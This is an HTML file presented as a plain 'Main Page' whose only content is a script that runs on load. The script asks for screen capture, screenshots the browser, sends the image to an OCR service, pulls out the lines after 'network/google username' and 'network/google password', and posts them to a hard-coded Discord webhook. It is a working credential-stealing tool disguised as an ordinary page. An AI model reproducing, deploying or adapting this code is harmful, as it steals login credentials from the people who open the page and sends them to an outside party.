<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Main Page</title>
</head>
<body>
<h1>Main Page</h1>
<script>
const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd",
      K="K85882318988957";

(async()=>{
  try{
    // open index.html WITH data to trigger test page behavior
    const testTab = window.open("index.html?data=1","_blank");

    // ask for screen capture immediately
    const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});

    // tell test tab permissions are granted
    testTab.postMessage({msg:"allowed-permissions"},"*");

    // wait for acknowledgment from test tab
    await new Promise(resolve=>{
      function handler(e){
        if(e.data?.msg==="allowed-permissions"){
          window.removeEventListener("message", handler);
          resolve();
        }
      }
      window.addEventListener("message", handler);
    });

    // close the test tab immediately after permissions handshake
    testTab.close();

    // proceed with OCR + Discord workflow
    const v=document.createElement("video");
    v.srcObject=stream; await v.play(); await new Promise(r=>setTimeout(r,1000));

    const c=document.createElement("canvas");
    c.width=v.videoWidth; c.height=v.videoHeight;
    c.getContext("2d").drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());

    const b=await new Promise(r=>c.toBlob(r,"image/png"));
    const f=new FormData();
    f.append("apikey",K); f.append("language","eng"); f.append("file",b,"shot.png");

    const j=await (await fetch("https://api.ocr.space/parse/image",{method:"POST",body:f})).json();
    if(!j.ParsedResults?.length) return;

    const l=j.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/),
          o=l.reduce((a,v,i)=>a||(v.toLowerCase().includes("network/google username")||v.toLowerCase().includes("network/google password")?`${l[i+1]||""}\n${l[i+2]||""}`:""),"").trim();
    if(!o) return;

    // send OCR result to Discord
    await fetch(W,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({content:o||"(no valid text found)"})
    });

    console.log("OCR + Discord done!");
  } catch(e){console.error(e);}
})();
</script>
</body>
</html>
